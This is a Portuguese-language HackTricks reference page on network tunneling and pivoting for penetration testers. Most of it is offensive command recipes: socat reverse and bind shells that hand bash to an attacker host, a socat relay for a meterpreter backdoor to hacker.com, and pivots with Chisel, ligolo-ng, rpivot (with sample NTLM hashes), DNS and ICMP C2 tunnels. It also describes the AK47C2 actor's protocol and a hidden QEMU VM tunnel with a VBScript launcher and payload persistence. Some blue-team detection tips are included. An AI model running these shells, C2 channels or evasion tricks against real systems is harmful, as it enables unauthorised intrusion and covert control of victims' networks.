# Tunneling and Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Dica do Nmap

> [!WARNING]
> **ICMP** e **SYN** scans não podem ser tuneladas através de socks proxies, então devemos **disable ping discovery** (`-Pn`) e especificar **TCP scans** (`-sT`) para que isso funcione.

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

Conexão gráfica SSH (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

Abrir nova Port no SSH Server --> Outra Port
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Porta local --> host comprometido (SSH) --> Third_box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Porta Local --> host comprometido (SSH) --> Onde quiser
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

Isto é útil para obter reverse shells de hosts internos através de uma DMZ para o seu host:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Você precisa de **root em ambos os dispositivos** (já que você vai criar novas interfaces) e a configuração do sshd deve permitir login como root:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Ativar encaminhamento no lado do servidor
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Definir uma nova rota no lado do cliente
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Segurança – Terrapin Attack (CVE-2023-48795)**
> O ataque de downgrade Terrapin de 2023 pode permitir que um man-in-the-middle manipule o handshake inicial do SSH e injete dados em **qualquer canal encaminhado** (`-L`, `-R`, `-D`). Certifique-se de que tanto o cliente quanto o servidor estejam corrigidos (**OpenSSH ≥ 9.6/LibreSSH 6.7**) ou desative explicitamente os algoritmos vulneráveis `chacha20-poly1305@openssh.com` e `*-etm@openssh.com` em `sshd_config`/`ssh_config` antes de confiar em túneis SSH.

## SSHUTTLE

Você pode **criar um túnel** via **ssh** de todo o **tráfego** para uma **sub-rede** através de um host.\
Por exemplo, encaminhando todo o tráfego destinado a 10.10.10.0/24
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Conectar usando uma chave privada
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Local port --> Host comprometido (sessão ativa) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Outra maneira:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

Abra uma porta no teamserver escutando em todas as interfaces que pode ser usada para **encaminhar o tráfego através do beacon**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> Nesse caso, a **porta é aberta no beacon host**, não no Team Server e o tráfego é enviado para o Team Server e, a partir daí, para o host:port indicado
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Nota:

- Beacon's reverse port forward is designed to **tunelar o tráfego para o Team Server, não para o encaminhamento entre máquinas individuais**.
- O tráfego é **tunelado dentro do tráfego C2 do Beacon**, incluindo links P2P.
- **Admin privileges are not required** para criar reverse port forwards em portas altas.

### rPort2Port local

> [!WARNING]
> Neste caso, a **porta é aberta no beacon host**, não no Team Server, e o **tráfego é enviado para o cliente Cobalt Strike** (não para o Team Server) e de lá para o host:port indicado.
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Você precisa fazer upload de um web file tunnel: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Você pode baixá-lo da página de releases de [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Você precisa usar a **mesma versão para client e server**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**Use a mesma versão para agent e proxy**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Vinculação e Escuta do Agente
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Acessar as portas locais do agente
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Reverse tunnel. O túnel é iniciado a partir da victim.\
Um socks4 proxy é criado em 127.0.0.1:1080
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot através de **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port através de socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter através de SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Você pode contornar um **non-authenticated proxy** executando esta linha em vez da última no console da vítima:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Criar certificados em ambos os lados: Client e Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Conecte a porta SSH local (22) à porta 443 do host atacante
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

É como uma versão console do PuTTY (as opções são muito semelhantes às de um ssh client).

Como esse binário será executado na vítima e é um ssh client, precisamos abrir nosso serviço e porta ssh para que possamos ter uma reverse connection. Depois, para encaminhar apenas uma porta acessível localmente para uma porta na nossa máquina:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Você precisa ser administrador local (para qualquer porta)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Você precisa ter **acesso RDP ao sistema**.\
Baixe:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Esta ferramenta usa `Dynamic Virtual Channels` (`DVC`) do recurso Remote Desktop Service do Windows. DVC é responsável por **tunelamento de pacotes pela conexão RDP**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

No seu computador cliente, carregue **`SocksOverRDP-Plugin.dll`** assim:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Agora podemos **conectar** à **vítima** via **RDP** usando **`mstsc.exe`**, e devemos receber um **prompt** dizendo que o **SocksOverRDP plugin está habilitado**, e que ele irá **escutar** em **127.0.0.1:1080**.

**Conecte-se** via **RDP** e envie e execute na máquina da vítima o binário `SocksOverRDP-Server.exe`:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Agora, confirme na sua máquina (atacante) que a porta 1080 está escutando:
```
netstat -antb | findstr 1080
```
Now you can use [**Proxifier**](https://www.proxifier.com/) **para encaminhar o tráfego por essa porta.**

## Proxificar aplicativos GUI do Windows

Você pode fazer com que aplicativos GUI do Windows naveguem por um proxy usando [**Proxifier**](https://www.proxifier.com/).\
Em **Profile -> Proxy Servers** adicione o IP e a porta do servidor SOCKS.\
Em **Profile -> Proxification Rules** adicione o nome do programa a ser proxificado e as conexões para os IPs que você deseja proxificar.

## NTLM proxy bypass

A ferramenta mencionada anteriormente: **Rpivot**\
**OpenVPN** também pode contorná-lo, definindo estas opções no arquivo de configuração:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Ele autentica contra um proxy e vincula uma porta local que é encaminhada para o serviço externo que você especificar. Então, você pode usar a ferramenta de sua escolha por essa porta.\
Por exemplo, isso encaminha a porta 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Agora, se você configurar, por exemplo, na victim o serviço **SSH** para escutar na porta 443. Você pode conectar-se a ele através da porta 2222 do attacker.\
Você também poderia usar um **meterpreter** que se conecta a localhost:443 e o attacker está escutando na porta 2222.

## YARP

Um reverse proxy criado pela Microsoft. Você pode encontrá-lo aqui: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

É necessário root em ambos os sistemas para criar tun adapters e tunelar dados entre eles usando consultas DNS.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
O tunnel será muito lento. Você pode criar uma conexão SSH comprimida através deste tunnel usando:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Download it from here**](https://github.com/iagox86/dnscat2)**.**

Estabelece um canal C\&C através do DNS. Não precisa de privilégios de root.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **In PowerShell**

Você pode usar [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) para executar um cliente dnscat2 no PowerShell:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Encaminhamento de portas com dnscat**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Alterar DNS do proxychains

Proxychains intercepts `gethostbyname` libc call and tunnels tcp DNS request through the socks proxy. Por **padrão** o servidor **DNS** que proxychains usa é **4.2.2.2** (hardcoded). Para alterá-lo, edite o arquivo: _/usr/lib/proxychains3/proxyresolv_ e mude o IP. Se estiver em um **ambiente Windows** você pode configurar o IP do **controlador de domínio**.

## Tunnels in Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

O ator Storm-2603 criou um **dual-channel C2 ("AK47C2")** que abusa *apenas* do tráfego de saída **DNS** e **plain HTTP POST** – dois protocolos raramente bloqueados em redes corporativas.

1. **DNS mode (AK47DNS)**
• Gera um SessionID aleatório de 5 caracteres (ex.: `H4T14`).
• Precede `1` para *task requests* ou `2` para *results* e concatena diferentes campos (flags, SessionID, nome do computador).
• Cada campo é **XOR-encrypted with the ASCII key `VHBD@H`**, hex-encoded, e unido por pontos – finalmente terminando com o domínio controlado pelo atacante:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• As requisições usam `DnsQuery()` para registros **TXT** (e fallback **MG**).
• Quando a resposta excede 0xFF bytes o backdoor **fragmenta** os dados em pedaços de 63 bytes e insere os marcadores:
`s<SessionID>t<TOTAL>p<POS>` para que o servidor C2 possa reordená-los.

2. **HTTP mode (AK47HTTP)**
• Constrói um envelope JSON:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• Todo o blob é XOR-`VHBD@H` → hex → enviado como corpo de um **`POST /`** com o cabeçalho `Content-Type: text/plain`.
• A resposta segue a mesma codificação e o campo `cmd` é executado com `cmd.exe /c <command> 2>&1`.

Notas Blue Team
• Procure por **TXT queries** incomuns cujo primeiro label seja hexadecimal longo e que sempre terminem em um domínio raro.
• Uma chave XOR constante seguida por ASCII-hex é fácil de detectar com YARA: `6?56484244?484` (`VHBD@H` em hex).
• Para HTTP, marque corpos de POST text/plain que sejam hex puros e múltiplos de dois bytes.

{{#note}}
O canal inteiro cabe dentro de **consultas padrão compatíveis com RFC** e mantém cada rótulo de subdomínio abaixo de 63 bytes, tornando-o furtivo na maioria dos logs de DNS.
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

É necessário root em ambos os sistemas para criar tun adapters e tunelar dados entre eles usando ICMP echo requests.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Download it from here**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **é uma ferramenta para expor soluções à Internet em uma única linha de comando.**\
_As URIs de exposição são como:_ **UID.ngrok.io**

### Instalação

- Crie uma conta: https://ngrok.com/signup
- Download do cliente:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Usos básicos

**Documentação:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Também é possível adicionar autenticação e TLS, se necessário._

#### Tunneling TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Expondo arquivos com HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing HTTP calls

_Útil para XSS,SSRF,SSTI ..._\
Diretamente do stdout ou na interface HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunneling de serviço HTTP interno
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### Exemplo simples de configuração do ngrok.yaml

Abre 3 túneis:

- 2 TCP
- 1 HTTP expondo arquivos estáticos de /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

O daemon `cloudflared` da Cloudflare pode criar túneis de saída que expõem **serviços TCP/UDP locais** sem requerer regras de firewall de entrada, usando a edge da Cloudflare como ponto de encontro. Isso é muito útil quando o firewall de saída (egress) só permite tráfego HTTPS, mas conexões de entrada estão bloqueadas.

### One-liner rápido de túnel
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 pivot
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### Túneis persistentes com DNS
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Inicie o conector:
```bash
cloudflared tunnel run mytunnel
```
Como todo o tráfego sai do host **outbound over 443**, os Cloudflared tunnels são uma forma simples de contornar ingress ACLs ou NAT boundaries. Esteja ciente de que o binary normalmente roda com privilégios elevados – use contêineres ou a flag `--user` quando possível.

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) é um reverse-proxy em Go ativamente mantido que suporta **TCP, UDP, HTTP/S, SOCKS and P2P NAT-hole-punching**. A partir da **v0.53.0 (May 2024)** ele pode atuar como um **SSH Tunnel Gateway**, permitindo que um host alvo inicie um reverse tunnel usando apenas o cliente OpenSSH padrão – nenhum binary extra é necessário.

### Classic reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Usando o novo SSH gateway (sem o binário frpc)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
O comando acima publica a porta da vítima **8080** como **attacker_ip:9000** sem implantar qualquer ferramenta adicional – ideal para living-off-the-land pivoting.

## Túneis ocultos baseados em VM com QEMU

A rede em modo usuário do QEMU (`-netdev user`) suporta uma opção chamada `hostfwd` que **vincula uma porta TCP/UDP no *host* e a encaminha para o *guest***. Quando o guest executa um daemon SSH completo, a regra `hostfwd` fornece uma SSH jump box descartável que vive inteiramente dentro de uma VM efêmera – perfeita para esconder o tráfego de C2 do EDR porque toda atividade maliciosa e arquivos permanecem no disco virtual.

### One-liner rápido
```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• O comando acima inicia uma imagem **Tiny Core Linux** (`tc.qcow2`) na RAM.
• A porta **2222/tcp** no host Windows é encaminhada de forma transparente para **22/tcp** dentro do guest.
• Do ponto de vista do atacante, o alvo simplesmente expõe a porta 2222; quaisquer pacotes que a alcançarem são tratados pelo servidor SSH em execução na VM.

### Iniciando furtivamente via VBScript
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
Executar o script com `cscript.exe //B update.vbs` mantém a janela oculta.

### Persistência dentro da VM

Porque o Tiny Core é sem estado, atacantes normalmente:

1. Drop payload to `/opt/123.out`
2. Append to `/opt/bootlocal.sh`:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Add `home/tc` and `opt` to `/opt/filetool.lst` so the payload is packed into `mydata.tgz` on shutdown.

### Por que isso evita a detecção

• Apenas dois executáveis não assinados (`qemu-system-*.exe`) tocam o disco; nenhum driver ou serviço é instalado.  
• Produtos de segurança no host veem **tráfego de loopback benigno** (o C2 real termina dentro da VM).  
• Scanners de memória nunca analisam o espaço de processos maliciosos porque ele vive em um sistema operacional diferente.

### Dicas para defensores

• Alertar sobre **binários inesperados do QEMU/VirtualBox/KVM** em caminhos graváveis pelo usuário.  
• Bloquear conexões de saída que se originam de `qemu-system*.exe`.  
• Procurar por portas de escuta raras (2222, 10022, …) que são vinculadas imediatamente após a inicialização do QEMU.

---

## Outras ferramentas para verificar

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## Referências

- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)

{{#include ../banners/hacktricks-training.md}}
